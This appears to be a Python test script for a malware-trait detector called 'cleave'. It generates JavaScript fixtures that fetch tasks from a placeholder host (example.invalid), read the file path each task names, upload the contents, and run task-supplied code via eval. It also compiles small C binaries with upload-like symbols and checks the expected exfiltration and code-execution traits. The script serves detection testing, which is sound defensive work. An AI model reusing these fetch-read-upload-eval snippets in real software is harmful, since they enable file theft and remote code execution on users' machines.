#!/usr/bin/env python3
"""Exercise HTTP tasking provenance; keep controls in the Cleave fixtures tree."""
import argparse
import json
import subprocess
from pathlib import Path

parser = argparse.ArgumentParser()
parser.add_argument('--cleave', default='cleave')
parser.add_argument('--fixtures-dir', required=True, type=Path)
args = parser.parse_args()
root = Path(__file__).resolve().parents[3]
args.fixtures_dir.mkdir(parents=True, exist_ok=True)
read = 'micro-behaviors/fs/read/file/full::http-response-file-path-read'
upload = 'micro-behaviors/communications/http/upload::fetch-file-read-body'
paired = 'objectives/exfiltration/stealer/file::http-selected-file-read-and-upload'
agent = 'objectives/exfiltration/stealer/file::http-task-file-upload-and-code-execution'
header = "const disk = require('node:fs');\nasync function run() {\n"
task = "const r = await fetch('https://example.invalid/tasks');\nconst job = await r.json();\n"
export = "await fetch('https://example.invalid/upload', {method: 'POST', body: disk.readFileSync(job.path)});\n"
execute = 'eval(job.code);\n'
end = '}\nrun();\n'
cases = {
    'agent.js': (header + task + export + execute + end, {read, upload, paired, agent}),
    'renamed.ts': ((header + task + export + execute + end).replace('job', '工作').replace('disk', '磁盘').replace('/tasks', '/new-route').replace('/upload', '/receive'), {read, upload, paired, agent}),
    'split-read.js': (header + task + "const bytes = disk.readFileSync(job.path);\nawait fetch('https://example.invalid/upload', {method: 'POST', body: bytes});\n" + execute + end, {read, upload, paired, agent}),
    'json-body.js': (header + task + "const bytes = disk.readFileSync(job.path);\nawait fetch('https://example.invalid/upload', {method: 'POST', body: JSON.stringify({data: bytes})});\n" + execute + end, {read, upload, paired, agent}),
    'local-upload.js': (header + task + export.replace('job.path', "'/var/log/app.log'") + execute + end, {upload}),
    'local-read-response-tag.js': (header + task + "await fetch('https://example.invalid/upload', {method: 'POST', body: JSON.stringify({data: disk.readFileSync('/var/log/app.log'), id: job.id})});\n" + execute + end, {upload}),
    'task-read-only.js': (header + task + 'console.log(disk.readFileSync(job.path));\n' + end, {read}),
    'transfer-client.js': (header + task + export + "eval('1+1');\n" + end, {read, upload, paired}),
    'ordinary-json-forward.js': (header + task + "await fetch('https://example.invalid/upload', {method: 'POST', body: JSON.stringify(job)});\n" + end, set()),
    'comment-only.js': ('/*\n' + header + task + export + execute + end + '*/\nconsole.log("hello");\n', set()),
}
for name, (source, expected) in cases.items():
    (args.fixtures_dir / name).write_text(source)
# Verify the consolidated symbol observation on actual binary symbols.
symbol_trait = 'micro-behaviors/communications/http/upload::http-upload-symbol'
native_cases = {}
for symbol in ['http_upload', 'curl_easy_upload', 'http_put', 'ordinary_request']:
    name = f'native-{symbol}'
    source_path = args.fixtures_dir / f'{name}.c'
    source_path.write_text(f'int {symbol}(void) {{ return 1; }}\nint main(void) {{ return {symbol}(); }}\n')
    subprocess.run(['cc', str(source_path), '-o', str(args.fixtures_dir / name)], check=True)
    native_cases[name] = {symbol_trait} if symbol != 'ordinary_request' else set()
result = subprocess.run([args.cleave, '--traits-dir', str(root), '--format', 'json', str(args.fixtures_dir)], capture_output=True, text=True)
if result.returncode:
    raise SystemExit(result.stderr or result.stdout or f'cleave exited {result.returncode}')
remaining = result.stdout.strip()
observations = []
while remaining:
    report, length = json.JSONDecoder().raw_decode(remaining)
    observations.extend(report.get('files', [report] if 'path' in report else []))
    remaining = remaining[length:].strip()
if not observations:
    raise AssertionError(f'No files in report: {list(report)}')
checked = 0
for file in observations:
    name = Path(file['path']).name
    if name in native_cases:
        actual = {trait['id'] for trait in file.get('traits', [])} & {symbol_trait}
        assert actual == native_cases[name], (name, actual, native_cases[name])
        print(f'PASS {name}')
        checked += 1
        continue
    if name not in cases:
        continue
    actual = {trait['id'] for trait in file.get('traits', [])} & {read, upload, paired, agent}
    assert actual == cases[name][1], (name, actual, cases[name][1])
    print(f'PASS {name}')
    checked += 1
assert checked == len(cases) + len(native_cases), (checked, len(cases) + len(native_cases))
print(f'{checked} focused cases passed')
